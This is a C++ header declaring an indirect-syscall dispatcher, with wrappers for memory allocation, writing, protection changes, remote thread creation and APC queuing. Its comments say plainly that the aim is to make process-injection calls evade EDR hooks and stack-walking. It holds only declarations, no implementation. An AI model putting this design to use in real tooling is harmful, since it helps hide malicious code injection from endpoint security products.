#pragma once

#include <windows.h>

// Indirect Syscall Dispatcher
// Based on 2025-2026 research: Dynamic SSN resolution + indirect syscall
// execution via legitimate ntdll code section jumps. This makes injection
// operations indistinguishable from normal kernel transitions, bypassing
// user-mode API hooking that EDR/security products commonly install.

namespace IndirectSyscall {

// Initialize the indirect syscall system by resolving SSNs from ntdll.
// Must be called once before using any indirect syscall wrappers.
// Returns true if indirect syscalls are available on this platform.
bool Initialize();

// Returns true if indirect syscalls are available and initialized.
// Currently only supported on x64 (AMD64) architecture.
bool IsAvailable();

// Shutdown and clean up cached data.
void Shutdown();

// --- Indirect syscall wrappers ---
// These mirror the Nt* functions but execute via indirect syscall stubs
// that jump through legitimate ntdll code, making the call stack appear
// clean to any EDR stack-walking analysis.

NTSTATUS IndirectNtAllocateVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect);

NTSTATUS IndirectNtWriteVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID BaseAddress,
    _In_ PVOID Buffer,
    _In_ SIZE_T NumberOfBytesToWrite,
    _Out_opt_ PSIZE_T NumberOfBytesWritten);

NTSTATUS IndirectNtProtectVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG NewProtect,
    _Out_ PULONG OldProtect);

NTSTATUS IndirectNtFreeVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG FreeType);

NTSTATUS IndirectNtCreateThreadEx(
    _Out_ PHANDLE ThreadHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ PVOID ObjectAttributes,
    _In_ HANDLE ProcessHandle,
    _In_ PVOID StartRoutine,
    _In_opt_ PVOID Argument,
    _In_ ULONG CreateFlags,
    _In_ SIZE_T ZeroBits,
    _In_ SIZE_T StackSize,
    _In_ SIZE_T MaximumStackSize,
    _In_opt_ PVOID AttributeList);

NTSTATUS IndirectNtQueueApcThread(
    _In_ HANDLE ThreadHandle,
    _In_ PVOID ApcRoutine,
    _In_opt_ PVOID ApcArgument1,
    _In_opt_ PVOID ApcArgument2,
    _In_opt_ PVOID ApcArgument3);

}  // namespace IndirectSyscall
